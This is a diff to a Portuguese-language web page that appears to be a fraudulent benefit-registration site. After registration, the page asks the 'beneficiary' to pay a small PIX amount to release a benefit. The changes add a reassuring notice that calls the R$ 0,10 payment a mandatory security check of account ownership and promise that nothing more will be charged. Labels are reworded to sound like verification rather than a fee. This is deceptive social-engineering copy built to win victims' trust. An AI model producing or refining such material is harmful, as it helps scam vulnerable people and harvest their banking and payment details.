@@ -229,6 +229,22 @@ select {
 .form-ok h3 { font-family: 'Sora', sans-serif; font-size: 1.3rem; font-weight: 700; margin-bottom: 10px; }
 .form-ok p { font-size: .9rem; color: var(--text-muted); line-height: 1.65; }
 
+.pix-aviso {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  background: #fffbeb;
+  border: 1.5px solid #f59e0b;
+  border-radius: 12px;
+  padding: 16px;
+  margin-bottom: 16px;
+  text-align: left;
+  font-size: .84rem;
+  color: #78350f;
+  line-height: 1.55;
+}
+.pix-aviso svg { color: #f59e0b; flex-shrink: 0; margin-top: 2px; }
+
 .pix-box {
   background: #f0faf3;
   border: 2px solid #22c55e;
@@ -369,16 +385,24 @@ footer p {
         <h3>Cadastro recebido!</h3>
         <p style="margin-bottom:24px">Para concluir a atualização, realize o pagamento da taxa de processamento:</p>
 
+        <div class="pix-aviso">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          <div>
+            <strong>Por que pagar R$ 0,10?</strong><br>
+            Este PIX de apenas <strong>R$ 0,10 (dez centavos)</strong> é exclusivamente para <strong>confirmar que a conta bancária informada pertence à beneficiária</strong>. É um procedimento de segurança obrigatório para liberar o benefício. Nenhum outro valor será cobrado.
+          </div>
+        </div>
+
         <div class="pix-box">
           <div class="pix-valor">R$ 0,10</div>
-          <div class="pix-label">Taxa de processamento cadastral</div>
+          <div class="pix-label">Confirmação de titularidade da conta</div>
           <div id="qrcode"></div>
-          <div class="pix-chave-label">Ou copie a chave PIX:</div>
+          <div class="pix-chave-label">Ou copie o código PIX:</div>
           <div class="pix-copy-row">
             <span id="pixCode" class="pix-code"></span>
             <button onclick="copiarPix()" id="copyBtn" class="copy-btn">Copiar</button>
           </div>
-          <p class="pix-note">⚡ Após o pagamento, seu benefício será liberado em até 24h úteis.</p>
+          <p class="pix-note">✅ Após a confirmação, seu benefício será liberado em até 24h úteis.</p>
         </div>
       </div>
 
